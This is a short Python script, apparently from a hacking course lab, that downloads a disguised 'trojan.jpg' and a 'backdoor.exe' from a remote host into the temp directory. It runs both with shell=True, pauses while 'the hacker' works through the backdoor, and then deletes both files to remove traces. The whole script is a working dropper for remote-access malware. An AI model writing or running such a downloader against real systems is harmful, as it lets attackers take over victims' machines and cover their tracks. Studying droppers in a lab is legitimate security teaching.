#!/usr/bin/env python3

"""
With this script we'll download and execute a normal file,
then we'll download and execute an evil file and finally both will be erased.
"""

import requests
import subprocess
import os
import tempfile

def download(url):
    """
    Cross-platform to download
    :param url:  where to download from
    """
    get_response = requests.get(url)
    file_name =  url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.64.128/evil_files/trojan.jpg")
command = "trojan.jpg"
subprocess.Popen(command, shell=True) # Executes a command in a separate process

download("http://192.168.64.128/evil_files/backdoor.exe")
command = "backdoor.exe"
subprocess.call(command, shell=True) # call so the program will stop here untill the hacker enters the exit command

os. remove("trojan.jpg")
os. remove("backdoor.exe")
